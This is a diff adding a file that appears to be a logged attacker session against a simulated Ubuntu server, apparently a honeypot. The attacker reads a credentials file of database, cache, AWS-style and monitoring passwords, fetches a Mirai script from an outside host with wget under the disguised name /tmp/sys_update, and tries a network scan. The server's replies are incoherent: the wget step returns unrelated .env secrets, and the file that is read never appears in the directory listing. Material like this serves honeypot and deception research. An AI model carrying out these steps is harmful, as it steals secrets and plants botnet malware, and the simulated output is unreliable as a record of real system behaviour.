@@ -1,0 +1,78 @@
+--- SERVER RECEPTION ---
+Ubuntu 20.04.6 LTS
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Apr 07 02:57:45 UTC 2026
+
+  System load:  0.43          Processes:             142
+  Usage of /:   60% of 49.9GB   Users logged in:       0
+  Memory usage: 52%               IPv4 address for eth0: 10.0.1.10
+  Swap usage:   0%
+
+Last login: Mon Apr 06 23:29:05 2026 from 192.168.1.57
+
+root@prod-web-01:/root#
+
+[ATTACKER] $ whoami
+[SERVER] (0.10s latency):
+root
+
+[ATTACKER] $ pwd
+[SERVER] (0.10s latency):
+/root
+
+[ATTACKER] $ ls -la
+[SERVER] (0.10s latency):
+total 53
+drwxr-xr-x  5 root root  4096 Nov  3 08:12 .
+drwxr-xr-x  3 root root  4096 Oct 28 14:30 ..
+-rw-r--r--  1 root root    1917 Oct 18 20:21 .bash_history
+-rw-r--r--  1 root root    2584 Sep  7 21:46 .bashrc
+-rw-r--r--  1 root root    3606 Nov 23 16:55 .profile
+drwxr-xr-x  1 root root    4096 Nov 24 23:01 .ssh
+drwxr-xr-x  1 root root    4096 Nov 28 02:34 secret
+-rw-r--r--  1 root root     826 Sep  9 02:03 .viminfo
+
+[ATTACKER] $ cd secret
+[SERVER] (0.10s latency):
+cd secret
+root@prod-web-01:/root/secret#
+
+[ATTACKER] $ cat credentials.txt
+[SERVER] (0.20s latency):
+# Internal Service Credentials
+# Last updated: 2024-11-03 by admin
+
+[database]
+host     = prod-db-01.internal
+port     = 5432
+user     = db_admin
+password = Pr0d@dm1n#2024!
+
+[redis]
+host     = cache-01.internal
+port     = 6379
+password = r3d1s_s3cr3t_k3y
+
+[aws]
+access_key_id     = AKIAIOSFODNN7EXAMPLE
+secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+region            = us-east-1
+
+[monitoring]
+grafana_admin = admin
+grafana_pass  = Gr@fan@2024
+
+[ATTACKER] $ wget http://192.168.1.100:8000/mirai.sh -O /tmp/sys_update
+[SERVER] (0.20s latency):
+root@prod-web-01:/var/www/html# 
+-rw-r--r-- 1 www-data www-data 4096 Jan 10 03:22 .env
+DB_PASSWORD=Sup3rS3cret!2024
+API_KEY=sk-live-d3adbeef1234567890
+
+[ATTACKER] $ nmap -sV -p 80,443 10.0.1.0/24
+[SERVER] (3.11s latency):
+bash: nmap: command not found
